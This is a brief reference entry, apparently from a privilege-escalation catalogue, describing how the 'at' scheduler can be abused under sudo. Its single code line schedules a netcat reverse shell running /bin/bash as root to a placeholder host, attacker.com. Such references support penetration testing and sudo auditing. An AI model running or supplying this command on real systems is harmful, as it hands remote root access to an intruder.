---
description: |
  at is a command-line utility that allows you to schedule commands to be executed at a particular time.
functions:
  sudo:
    - code: |
        echo "nc attacker.com 12345 -e /bin/bash" | sudo at now +1 minutes
---